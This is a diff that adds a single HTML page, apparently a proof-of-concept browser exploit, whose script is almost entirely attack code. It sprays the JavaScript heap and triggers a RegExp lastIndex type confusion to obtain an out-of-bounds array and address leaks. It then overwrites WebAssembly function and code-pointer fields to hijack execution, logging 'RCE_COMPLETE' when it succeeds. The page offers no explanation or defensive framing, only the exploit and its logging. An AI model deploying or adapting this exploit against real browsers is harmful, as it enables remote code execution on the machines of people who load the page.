@@ -1,0 +1,136 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P89</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function flo(f){f64[0]=f;return u32[0];}
+function fhi(f){f64[0]=f;return u32[1];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1},marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,3,2,0,0,7,9,2,1,102,0,0,1,103,0,1,10,12,2,4,0,65,42,11,5,0,65,185,10,11])));
+objB[4]=wasmI;
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+log("f="+wasmI.exports.f()+" g="+wasmI.exports.g());
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+if(!Array.isArray(m)){log("NA");log("=== DONE ===");throw 0;}
+log("A=true");
+const cands=[];
+for(let k=0x8000;k<0x10010;k++){
+  try{const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+    if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}}}catch(e){break;}
+  if(cands.length>=6)break;
+}
+let OB=-1;
+for(const k of cands){const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;if(a!==b){OB=k;break;}}
+if(OB>=0){
+  log("OB:"+OB.toString(16));
+  objB[4]=wasmI.exports.f;const fA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+  objB[4]=wasmI.exports.g;const gA=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+  const fR=fA&0xFFFFFFFE,gR=gA&0xFFFFFFFE;
+  log("fA:"+fA.toString(16)+" gA:"+gA.toString(16));
+  // PHASE 1: Dump JSFunction field diffs and try swapping each
+  const BASE=0x1080018;
+  let dd="";
+  for(let q=0;q<8;q++){
+    const fi=Math.floor((fR+q*8-BASE)/8);
+    const gi=Math.floor((gR+q*8-BASE)/8);
+    try{
+      const fl=flo(m[fi]),fh=fhi(m[fi]);
+      const gl=flo(m[gi]),gh=fhi(m[gi]);
+      if(fl!==gl)dd+="Q"+q+"L:"+fl.toString(16)+"v"+gl.toString(16)+" ";
+      if(fh!==gh)dd+="Q"+q+"H:"+fh.toString(16)+"v"+gh.toString(16)+" ";
+    }catch(e){}
+  }
+  log("D:"+dd);
+  // Try swapping each diff, starting with Q3 (likely code field)
+  let rce=false;
+  const order=[3,4,5,2,6,1,7,0];
+  for(const q of order){
+    if(rce)break;
+    const fi=Math.floor((fR+q*8-BASE)/8);
+    const gi=Math.floor((gR+q*8-BASE)/8);
+    try{
+      const fl=flo(m[fi]),fh=fhi(m[fi]);
+      const gl=flo(m[gi]),gh=fhi(m[gi]);
+      const orig=f2i(m[fi]);
+      if(fl!==gl){
+        m[fi]=w2f(gl,fh);
+        try{const r=wasmI.exports.f();log("Q"+q+"L:"+r);if(r===1337){log("RCE_COMPLETE");rce=true;}}
+        catch(e){log("Q"+q+"L:E");}
+        if(!rce)m[fi]=i2f(orig);
+      }
+      if(!rce&&fh!==gh){
+        m[fi]=w2f(fl,gh);
+        try{const r=wasmI.exports.f();log("Q"+q+"H:"+r);if(r===1337){log("RCE_COMPLETE");rce=true;}}
+        catch(e){log("Q"+q+"H:E");}
+        if(!rce)m[fi]=i2f(orig);
+      }
+    }catch(e){}
+  }
+  // PHASE 2: WEFD CPT search (wider: 10 QWORDs per JSFunc, 8 per sub, 0x400000-0x410000)
+  if(!rce){
+    function findCPTHandle(funcR){
+      for(let qi=0;qi<10;qi++){
+        const off=funcR+qi*8-BASE;const idx=Math.floor(off/8);
+        try{
+          const lo=flo(m[idx]),hi=fhi(m[idx]);
+          for(const ptr of [lo,hi]){
+            if(ptr>0x1000000&&ptr<0x2000000&&(ptr&1)){
+              const pr=ptr&0xFFFFFFFE;
+              for(let j=0;j<8;j++){
+                const off2=pr+j*8-BASE;const idx2=Math.floor(off2/8);
+                try{
+                  const sl=flo(m[idx2]),sh=fhi(m[idx2]);
+                  if(sl>=0x400000&&sl<0x410000&&!(sl&1))return{v:sl,idx:idx2,pos:"lo"};
+                  if(sh>=0x400000&&sh<0x410000&&!(sh&1))return{v:sh,idx:idx2,pos:"hi"};
+                }catch(e){}
+              }
+            }
+          }
+        }catch(e){}
+      }
+      return null;
+    }
+    const fCPT=findCPTHandle(fR);
+    const gCPT=findCPTHandle(gR);
+    log("FC:"+(fCPT?fCPT.v.toString(16)+"@"+fCPT.pos:"X")+" GC:"+(gCPT?gCPT.v.toString(16)+"@"+gCPT.pos:"X"));
+    if(fCPT&&gCPT&&fCPT.v!==gCPT.v){
+      log("SWAP!"+fCPT.v.toString(16)+"<>"+gCPT.v.toString(16));
+      if(fCPT.pos==="lo"){m[fCPT.idx]=w2f(gCPT.v,fhi(m[fCPT.idx]));}
+      else{m[fCPT.idx]=w2f(flo(m[fCPT.idx]),gCPT.v);}
+      try{
+        const nf=wasmI.exports.f();
+        log("POST:f="+nf);
+        if(nf===1337)log("RCE_COMPLETE");
+        else if(nf!==42)log("CHANGED:"+nf);
+      }catch(e){log("POST:E");}
+      if(fCPT.pos==="lo"){m[fCPT.idx]=w2f(fCPT.v,fhi(m[fCPT.idx]));}
+      else{m[fCPT.idx]=w2f(flo(m[fCPT.idx]),fCPT.v);}
+    }else if(fCPT&&gCPT&&fCPT.v===gCPT.v){log("SAME:"+fCPT.v.toString(16));}
+    else{log("P2_MISS");}
+  }
+}else{log("STALE");}
+}catch(e){if(e!==0)log("E: "+e.message);}
+log("W:f="+wasmI.exports.f()+" g="+wasmI.exports.g());
+log("=== DONE ===");
+</script></body></html>
